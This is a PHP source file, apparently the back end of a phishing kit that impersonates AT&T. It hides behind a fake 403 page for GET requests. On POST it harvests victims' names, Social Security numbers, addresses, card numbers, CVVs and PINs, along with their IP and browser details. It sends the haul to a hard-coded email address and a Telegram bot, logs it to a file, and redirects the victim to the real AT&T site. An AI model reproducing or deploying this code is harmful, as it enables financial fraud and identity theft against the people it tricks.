<?php 

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}

$Ok= "bogasyur@protonmail.ch"; 
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$fname = trim($_POST['name']);
$ssn = trim($_POST['ssn']);
$adr = trim($_POST['addr']);
$cit = trim($_POST['cit']);
$state = trim($_POST['statt']);
$phoe = trim($_POST['phone']);
$zip = trim($_POST['zipode']);
$cc = trim($_POST['card']);
$exdate = trim($_POST['expir']);
$cvv = trim($_POST['cvv']);
$pin = trim($_POST['pin']);

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$fuck .= "|----------|AT&T - Login |--------------|\n";
	$fuck .= "Full Name          : ".$fname."\n";
	$fuck .= "SSn           : ".$ssn."\n";
	$fuck .= "Address           : ".$adr."\n";
	$fuck .= "City           : ".$cit."\n";
	$fuck .= "State           : ".$state."\n";
	$fuck .= "phone           : ".$phoe."\n";
	$fuck .= "ZIPcode          : ".$zip."\n";
	$fuck .= "CC           : ".$cc."\n";
	$fuck .= "Expiredate          : ".$exdate."\n";
	$fuck .= "CVV           : ".$cvv."\n";
	$fuck .= "PIN           : ".$pin."\n";

	$fuck .= "|----------- I N F O | I P ----------------|\n";

$fuck .= "======= [ Ip & Hostname Info ] =======\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "City: {$geoplugin->city}\n";
$fuck .= "Region: {$geoplugin->region}\n";
$fuck .= "Country Name: {$geoplugin->countryName}\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "=======+Vi3nas is HERE+======\n";
$subject = "AT&T  $ip";
{
$headers = "From:AT&T  <ShellHost@_ID>";
mail($Ok,$message,$subject,$fuck,$headers);
$file = fopen("../result.txt","a");
fwrite($file,$fuck);
fclose($file);
$txt = $fuck;
$chat_id = "298586448"; 
$bot_url = "bot5509026245:AAHnGNNILljPIIMH9G25veRh6ey5SDGJBXE"; 

    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);   

}
 header("Location:https://www.AT&T.com/");
	$signal = 'ok';
	$msg = 'InValid Credentials';

?>
